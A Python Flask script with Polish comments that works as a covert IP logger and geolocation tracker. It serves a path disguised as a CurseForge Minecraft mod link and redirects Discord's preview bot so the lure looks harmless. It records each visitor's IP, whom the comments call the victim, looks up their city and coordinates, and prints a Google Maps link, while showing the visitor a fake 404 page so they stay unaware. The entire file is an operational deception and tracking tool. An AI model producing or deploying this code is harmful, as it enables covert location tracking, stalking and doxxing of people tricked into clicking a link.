from flask import Flask, request, redirect
import requests
import sys

app = Flask(__name__)

# --- KONFIGURACJA ---
# Link, na który wyślemy bota Discorda, żeby nie pokazał podglądu (np. pusty obrazek)
BOT_REDIRECT = "https://example.com" 

@app.route('/www.curseforge.com/minecraft/mc-mods/7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. OSZUKIWANIE BOTA DISCORDA
    # Przekierowujemy bota na zewnętrzną stronę, przez co Discord nie wygeneruje podglądu CurseForge.
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return redirect(BOT_REDIRECT)

    # 2. LOGOWANIE DANYCH W KONSOLI RENDERA
    print(f"\n[!!!] OFIARA NAMIERZONA [!!!]", flush=True)
    print(f"IP: {ip}", flush=True)
    
    try:
        # Pobieranie danych geograficznych
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country", timeout=5).json()
        if r.get("status") == "success":
            lat = r.get('lat')
            lon = r.get('lon')
            # Generowanie linku do Google Maps dla Ciebie w konsoli
            print(f"MIASTO: {r.get('city')}, {r.get('country')}", flush=True)
            print(f"LINK DO MAPY: https://www.google.com/maps?q={lat},{lon}", flush=True)
    except Exception as e:
        print(f"Błąd lokalizacji: {e}", flush=True)
    
    sys.stdout.flush()

    # 3. CO WIDZI OFIARA?
    # Zostawiamy ją na czarnym ekranie z napisem o błędzie, żeby nie wiedziała, co się stało.
    return '''
    <body style="background-color: #000; color: #333; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
        <div style="text-align: center;">
            <p>404 Not Found</p>
        </div>
    </body>
    ''', 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
